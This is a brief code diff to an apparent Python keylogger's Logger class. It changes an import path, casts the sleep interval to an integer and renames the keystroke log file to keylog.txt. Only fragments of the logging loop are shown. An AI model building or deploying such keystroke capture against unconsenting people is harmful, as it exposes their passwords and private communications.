@@ -3,7 +3,7 @@ from threading import Thread
 from time import sleep
 import os
 
-from normalize_path import normalize_path_name
+from modules.normalize_path import normalize_path_name
 
 
 class Logger:
@@ -21,9 +21,9 @@ class Logger:
 
             t.start()
 
-            sleep(self.frequency)
+            sleep(int(self.frequency))
 
-            with open(normalize_path_name(self.user_path, 'keylog_record', 'log.txt'), 'a+') as output_file:
+            with open(normalize_path_name(self.user_path, 'keylog_record', 'keylog.txt'), 'a+') as output_file:
                 output_file.write(self.get_log())
 
     def on_press(self, key):
